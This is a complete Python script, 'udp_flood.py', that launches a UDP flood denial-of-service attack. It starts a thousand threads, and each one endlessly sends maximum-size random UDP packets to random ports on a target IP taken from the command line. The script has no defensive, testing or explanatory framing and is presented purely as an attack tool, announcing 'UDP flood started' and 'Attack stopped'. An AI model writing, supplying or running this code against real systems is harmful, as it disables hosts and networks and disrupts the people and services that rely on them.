# udp_flood.py
import socket
import random
import sys
import threading
import os
import time

TARGET_IP = sys.argv[1]
THREADS = 1000
PACKET_SIZE = 65507
counter = 0

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    global counter
    while True:
        data = os.urandom(PACKET_SIZE)
        port = random.randint(1, 65535)
        try:
            sock.sendto(data, (TARGET_IP, port))
            counter += 1
        except:
            pass

if __name__ == "__main__":
    print(f"💣 UDP flood started on {TARGET_IP}")
    for _ in range(THREADS):
        threading.Thread(target=udp_flood, daemon=True).start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")

